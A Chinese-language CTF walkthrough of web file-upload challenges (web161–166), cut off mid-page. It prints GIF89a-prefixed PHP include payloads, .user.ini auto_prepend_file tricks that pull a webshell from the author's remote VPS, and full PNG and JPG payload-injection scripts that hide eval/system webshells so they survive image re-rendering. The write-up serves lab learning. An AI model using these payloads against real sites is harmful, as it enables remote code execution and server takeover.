src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19211006.png" alt="2024-09-19211006"></p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>在web160的基础上加了GIF89a进行验证就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19212242.png" alt="2024-09-19212242"></p><p>基本上和web160一致</p><h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>上强度了，看了一下wp这里的介绍是远程包含，有点xxe那味道了。这题过滤了<code>.</code>基本的文件尾就不能用了。</p><p>由于我们知道具体的文件在哪，所以就直接写命令执行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>auto<span class="hljs-emphasis">_prepend_</span>file=orange<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19214003.png" alt="2024-09-19214003"></p><p>然后写一个orange.png，里面内容是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>&lt;?=include&quot;http://142748273:5000/orange&quot;?&gt;<br></code></pre></td></tr></table></figure><p>简单的解释一下，我在我的一个vps下写了一个马，这里远程包含我的马，我开了5000这个端口，由于.被过滤了，所以需要ip转int型</p><p>其他的流程基本和上面一致</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19220630.png" alt="2024-09-19220630"></p><p>本地你的物理机都需要一开始是png然后在bp里删掉的，这里注意一下。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>涉及条件竞争，由于环境就不演示了，网上有很多大师傅都有wp讲解，可以去看看</p><h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>传图片后，会被删除,在网上看wp的时，看到一个约过中间，直接写的思路</p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>条件竞争，网上自己找吧</p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>直接在.user.ini里写入远程的地址</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>auto<span class="hljs-emphasis">_prepend_</span>file=http://142748273:5000/orange<br></code></pre></td></tr></table></figure><p>然后vps开服务，就行了，本地的物理机都还是上传png只不过bp删掉了而已</p><h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>进行了简单的尝试，发现上传的哪怕是真图片马，也是被进行二次转化，下载下面里面的马就没有了，应该是图片的二次渲染.</p><p>借用网上的脚本跑一下吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;ornage.png&#x27;</span>);  <br> <br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span><br><span class="hljs-comment">//会在目录下自动创建一个1.png图片</span><br><span class="hljs-comment">//图片脚本内容：$_GET[0]($_POST[1]);</span><br><span class="hljs-comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19224702.png" alt="2024-09-19224702"></p><p>然后ctrl+s把图片下载下来用txt看可以得到flag，第一次见二次渲染的题</p><h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>上一题是png的二次渲染，这题是jpg的二次渲染，可以通过前端的代码知晓，脚本是网上比较多的，这里直接先贴过来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment">    */</span><br> <br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;<br> <br> <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br> <br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br> <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br> <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>orz这题我在本地测试了很久都没有找到一个合适的jpg，就是通过这个脚本执行然后上传就行了，多找一些jpg进行尝试，成功率比较低因为有的文件可能会有特殊字符导致解析失败,我在本地没有打通</p><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-btn&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">lay-data</span>=<span class="hljs-string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: 